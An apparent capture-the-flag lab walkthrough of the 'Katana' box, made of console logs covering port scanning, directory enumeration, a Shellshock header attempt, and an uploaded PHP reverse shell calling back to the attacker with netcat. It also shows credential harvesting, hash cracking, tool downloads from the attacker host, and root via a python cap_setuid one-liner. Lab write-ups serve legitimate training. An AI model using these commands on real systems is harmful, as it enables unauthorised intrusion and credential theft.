# Recon

```console
root@kali:/OSCPv3/offsec_pg/Katana# nmap -Pn -sT -sV -n 192.168.150.83 -p- --min-rate 1000 --max-retries 2 --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-23 16:55 CST
Warning: 192.168.150.83 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.150.83
Host is up, received user-set (0.12s latency).
Not shown: 64876 closed ports, 653 filtered ports
Reason: 64876 conn-refused and 653 no-responses
PORT     STATE SERVICE       REASON  VERSION
21/tcp   open  ftp           syn-ack vsftpd 3.0.3
22/tcp   open  ssh           syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http          syn-ack Apache httpd 2.4.38 ((Debian))
7080/tcp open  ssl/empowerid syn-ack LiteSpeed
8088/tcp open  http          syn-ack LiteSpeed httpd
8715/tcp open  http          syn-ack nginx 1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


## TCP/21 FTP

```console
root@kali:/OSCPv3/offsec_pg/Katana# ftp 192.168.150.83
Connected to 192.168.150.83.
220 (vsFTPd 3.0.3)
Name (192.168.150.83:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> quit
221 Goodbye.
```


## TCP/80 HTTP

```console
root@kali:/OSCPv3/offsec_pg/Katana# curl 192.168.150.83
<head>
<title>Katana X</title>
<style>
body {
background: url(./14401.jpg) no-repeat center center fixed;
-webkit-background-size: cover;
-moz-background-size: cover;
-o-background-size: cover;
background-size: cover;
color: white;
}
.twitter a{
text-decoration: none;
font-family: Arial, sans-serif ;
font-size: 50px;
text-shadow: grey 0px 0px 10px;
}
}</style>
</head>
<body><center>
<table width=100% height=100%><td align=center><br>
<div id=bar style="position: fixed; width: 100%; bottom: 0px; font-family: Tahoma; height: 20px; color: white; font-size: 13px; left: 0px; border-top: 2px solid darkred; padding: 30px; background-color: #000"
</body>
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/1.png)

```console
root@kali:/OSCPv3/offsec_pg/Katana# nmap -Pn -sT -sV --script http-enum -n 192.168.150.83 -p 80 --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-23 17:02 CST
Nmap scan report for 192.168.150.83
Host is up, received user-set (0.13s latency).

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.02 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Katana# python3 /opt/dirsearch/dirsearch.py -u http://192.168.150.83 -w /usr/share/dirb/wordlists/common.txt -e php,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /opt/dirsearch/logs/errors-21-11-23_17-04-48.log

Target: http://192.168.150.83

[17:04:49] Starting: 
[17:04:49] 200 -  655B  - /
[17:05:06] 301 -  316B  - /ebook  ->  http://192.168.150.83/ebook/
[17:05:15] 200 -  655B  - /index.html

Task Completed
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/2.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/3.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/4.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/5.png)


```console
root@kali:/OSCPv3/offsec_pg/Katana# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
--2021-11-23 17:11:20--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.109.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 5491 (5,4K) [text/plain]
Grabando a: “php-reverse-shell.php”

php-reverse-shell.php               100%[===================================================================>]   5,36K  --.-KB/s    en 0s      

2021-11-23 17:11:20 (23,7 MB/s) - “php-reverse-shell.php” guardado [5491/5491]
```

```console
root@kali:/OSCPv3/offsec_pg/Katana# nano php-reverse-shell.php 
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.49.150';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/6.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/7.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/8.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/9.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/10.png)


## TCP/8088 HTTP

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/11.png)

```console
root@kali:/OSCPv3/offsec_pg/Katana# nmap -Pn -sT -sV -n 192.168.150.83 -p 8088 --script http-enum 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-23 18:03 CST
Nmap scan report for 192.168.150.83
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
8088/tcp open  http    LiteSpeed httpd
| http-enum: 
|_  /phpinfo.php: Possible information file
|_http-server-header: LiteSpeed

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 320.34 seconds
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/12.png)

```console
root@kali:/OSCPv3/offsec_pg/Katana# python3 /opt/dirsearch/dirsearch.py -u http://192.168.150.83:8088/ -w /usr/share/dirb/wordlists/common.txt -e php,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /opt/dirsearch/logs/errors-21-11-23_18-16-08.log

Target: http://192.168.150.83:8088/

[18:16:08] Starting: 
[18:16:09] 200 -  655B  - /
[18:16:19] 301 -    1KB - /blocked  ->  http://192.168.150.83:8088/blocked/
[18:16:22] 301 -    1KB - /cgi-bin  ->  http://192.168.150.83:8088/cgi-bin/
[18:16:26] 301 -    1KB - /css  ->  http://192.168.150.83:8088/css/
[18:16:29] 301 -    1KB - /docs  ->  http://192.168.150.83:8088/docs/
[18:16:40] 301 -    1KB - /img  ->  http://192.168.150.83:8088/img/
[18:16:40] 200 -  655B  - /index.html
[18:16:55] 200 -   50KB - /phpinfo.php
[18:16:59] 301 -    1KB - /protected  ->  http://192.168.150.83:8088/protected/

Task Completed
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/13.png)

```console
root@kali:/OSCPv3/offsec_pg/Katana# searchsploit OpenLiteSpeed
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenLitespeed 1.3.9 - Use-After-Free (Denial of Service)                                                      | linux/dos/37051.c
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```console
root@kali:/OSCPv3/offsec_pg/Katana# python3 /opt/dirsearch/dirsearch.py -u http://192.168.150.83:8088/cgi-bin -w /usr/share/dirb/wordlists/common.txt -e php,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /opt/dirsearch/logs/errors-21-11-23_18-59-51.log

Target: http://192.168.150.83:8088/cgi-bin

[18:59:52] Starting: 
[19:00:17] 200 -   13B  - /cgi-bin/helloworld

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/Katana# curl -A '() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id' http://192.168.150.83:8088/cgi-bin/helloworld
<!DOCTYPE html>
<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title> 400 Bad Request
</title></head>
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">400</h1>
<h2 style="margin-top:20px;font-size: 30px;">Bad Request
</h2>
<p>It is not a valid request!</p>
</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
<br>Proudly powered by  <a style="color:#fff;" href="http://www.litespeedtech.com/error-page">LiteSpeed Web Server</a><p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>
```

```console
root@kali:/OSCPv3/offsec_pg/Katana# python3 /opt/dirsearch/dirsearch.py -u http://192.168.150.83:8088/ -w /usr/share/dirb/wordlists/big.txt -e php,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 20469

Error Log: /opt/dirsearch/logs/errors-21-11-23_19-16-07.log

Target: http://192.168.150.83:8088/

[19:16:08] Starting: 
[19:17:01] 301 -    1KB - /blocked  ->  http://192.168.150.83:8088/blocked/
[19:17:14] 301 -    1KB - /cgi-bin  ->  http://192.168.150.83:8088/cgi-bin/
[19:17:32] 301 -    1KB - /css  ->  http://192.168.150.83:8088/css/
[19:17:42] 301 -    1KB - /docs  ->  http://192.168.150.83:8088/docs/
[19:18:28] 301 -    1KB - /img  ->  http://192.168.150.83:8088/img/
[19:19:36] 301 -    1KB - /protected  ->  http://192.168.150.83:8088/protected/

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/Katana# python3 /opt/dirsearch/dirsearch.py -u http://192.168.150.83:8088/ -e php,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 6432

Error Log: /opt/dirsearch/logs/errors-21-11-23_19-22-20.log

Target: http://192.168.150.83:8088/

[19:22:20] Starting: 
[19:22:21] 400 -    1KB - /%2e%2e/google.com
[19:22:53] 301 -    1KB - /cgi-bin  ->  http://192.168.150.83:8088/cgi-bin/
[19:22:57] 301 -    1KB - /css  ->  http://192.168.150.83:8088/css/
[19:23:00] 301 -    1KB - /docs  ->  http://192.168.150.83:8088/docs/
[19:23:00] 200 -    5KB - /docs/
[19:23:08] 301 -    1KB - /img  ->  http://192.168.150.83:8088/img/
[19:23:09] 200 -  655B  - /index.html
[19:23:23] 200 -   50KB - /phpinfo.php
[19:23:39] 200 -    6KB - /upload.html
[19:23:39] 200 -    2KB - /upload.php

Task Completed
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/14.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/15.png)


# TCP/8715 HTTP

admin/admin

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/16.png)

```console
root@kali:/OSCPv3/offsec_pg/Katana# curl http://192.168.150.83:8715/katana_php-reverse-shell.php
```


```console
root@kali:/OSCPv3/offsec_pg/Katana# nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.49.150] from (UNKNOWN) [192.168.150.83] 34612
Linux katana 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 20:31:24 up  2:40,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@katana:/$ ^Z
[1]+  Detenido                nc -lvnp 443
root@kali:/OSCPv3/offsec_pg/Katana# stty raw -echo
root@kali:/OSCPv3/offsec_pg/Katana# nc -lvnp 443
                                                reset
reset: unknown terminal type unknown
Terminal type? xterm
www-data@katana:/$ export TERM=xterm
www-data@katana:/$ export SHELL=bash
www-data@katana:/$ 
```

```console
www-data@katana:/home/katana$ cd /opt/manager/html/
www-data@katana:/opt/manager/html$ ls
14401.jpg  index.html  katana_php-reverse-shell.php  katana_testttt.jpg
```

```console
www-data@katana:/opt/manager/html$ ls
14401.jpg  index.html  katana_php-reverse-shell.php  katana_testttt.jpg
www-data@katana:/opt/manager/html$ find / -name local.txt 2>/dev/null
/var/www/local.txt
www-data@katana:/opt/manager/html$ cat /var/www/local.txt
70b982b7a914447d20c40a652e321556
```

# Privilege escalation

```console
www-data@katana:~/html/ebook/database$ more www_project.sql
-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE IF NOT EXISTS `admin` (
  `name` varchar(20) COLLATE latin1_general_ci NOT NULL,
  `pass` varchar(40) COLLATE latin1_general_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`name`, `pass`) VALUES
('admin', 'd033e22ae348aeb5660fc2140aec35850c4da997');

-- --------------------------------------------------------

--
-- Table structure for table `books`
--

....
....
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Katana/img/17.png)

```console
www-data@katana:~/html/ebook/functions$ more database_functions.php 
<?php
	function db_connect(){
		$conn = mysqli_connect("localhost", "ebook", "password@123", "ebook");
		if(!$conn){
			echo "Can't connect database " . mysqli_connect_error($conn);
			exit;
		}
		return $conn;
	}
....
....

```

```console
www-data@katana:~/html/ebook/functions$ mysql -e '\! whoami' -u ebook -p
Enter password: 
www-data
www-data@katana:~/html/ebook/functions$
```

```console
root@kali:/OSCPv3/offsec_pg/Katana# nano pwd
katana:$6$dX6scf3V2g2lMuzx$OP1qOSkNIaKL9cnGKObhRTJxeo9p0BwyOzsISHQGPvnTajSuxZN6eZ9U4GBY8mYsPRYuzrejhiTPsp45haxY2/:1000:1000:katana,,,:/home/katana:/bin/bash
root@kali:/OSCPv3/offsec_pg/Katana# john --wordlist=/usr/share/wordlists/rockyou.txt pwd
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
...
...
```

```console
www-data@katana:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/umount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/fusermount
www-data@katana:/tmp$
```

```console
www-data@katana:/tmp$ wget http://192.168.49.150:9000/linpeas.sh
--2021-11-23 21:06:01--  http://192.168.49.150:9000/linpeas.sh
Connecting to 192.168.49.150:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 634071 (619K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                          100%[===================================================================>] 619.21K   140KB/s    in 4.5s    

2021-11-23 21:06:06 (137 KB/s) - 'linpeas.sh' saved [634071/634071]

www-data@katana:/tmp$ chmod +x linpeas.sh 
www-data@katana:/tmp$ ./linpeas.sh > linpeas.txt
...
...
```


```console
www-data@katana:/tmp$ wget http://192.168.49.150:9000/pspy64s   
--2021-11-23 21:27:07--  http://192.168.49.150:9000/pspy64s
Connecting to 192.168.49.150:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1156536 (1.1M) [application/octet-stream]
Saving to: 'pspy64s'

pspy64s                             100%[===================================================================>]   1.10M   289KB/s    in 4.7s    

2021-11-23 21:27:12 (239 KB/s) - 'pspy64s' saved [1156536/1156536]

www-data@katana:/tmp$ chmod +x pspy64s 
```

```console
www-data@katana:/tmp$ ./pspy64s 
...
...
...
2021/11/23 21:27:45 CMD: UID=0    PID=472    | /usr/sbin/sshd -D 
2021/11/23 21:27:45 CMD: UID=0    PID=429    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2021/11/23 21:27:45 CMD: UID=0    PID=422    | /usr/sbin/vsftpd /etc/vsftpd.conf 
2021/11/23 21:27:45 CMD: UID=0    PID=421    | /usr/sbin/rsyslogd -n -iNONE 
2021/11/23 21:27:45 CMD: UID=0    PID=420    | /lib/systemd/systemd-logind 
2021/11/23 21:27:45 CMD: UID=0    PID=414    | php-fpm: master process (/etc/php/7.3/fpm/php-fpm.conf)                       
2021/11/23 21:27:45 CMD: UID=0    PID=413    | /usr/sbin/cron -f 
...
...
2021/11/23 21:30:01 CMD: UID=0    PID=16186  | /bin/sh -c chown www-data:www-data /opt/manager/html/* 
2021/11/23 21:30:01 CMD: UID=0    PID=16187  | /bin/sh -c /bin/delhis 
2021/11/23 21:30:01 CMD: UID=0    PID=16188  | /bin/bash /bin/delhis 
2021/11/23 21:30:01 CMD: UID=0    PID=16189  | /bin/bash /bin/delhis 
...
...
```

```console
www-data@katana:/tmp$ file /bin/delhis
/bin/delhis: Bourne-Again shell script, ASCII text executable
www-data@katana:/tmp$ ls -la /bin/delhis
-rwxr-xr-x 1 root root 87 May 11  2020 /bin/delhis
```

```console
www-data@katana:/var/mail$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep
```

```console
www-data@katana:/var/mail$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep
www-data@katana:/var/mail$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
root@katana:/var/mail# whoami
root
root@katana:/var/mail# cd /root/
root@katana:/root# ls
proof.txt  root.txt
root@katana:/root# cat proof.txt 
1bd16878d22e0e484be1d99cc3edaafd
```


https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities

```console
root@katana:/tmp# cat /proc/16323/status | grep Cap
CapInh:	0000000000000000
CapPrm:	0000000000000080
CapEff:	0000000000000080
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000
root@katana:/tmp# capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```

```console
root@katana:/tmp# capsh --decode=0000000000000080
0x0000000000000080=cap_setuid
```

```console
root@katana:/tmp# getpcaps 16323
Capabilities for `16323': = cap_setuid+ep
```

```console
root@katana:/tmp# getcap /usr/bin/python2.7 
/usr/bin/python2.7 = cap_setuid+ep
```

gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash


#Set Capability
setcap cap_net_raw+ep /sbin/ping
#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep

```console
root@katana:/tmp# capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=33(www-data)
groups=33(www-data)
```

https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities


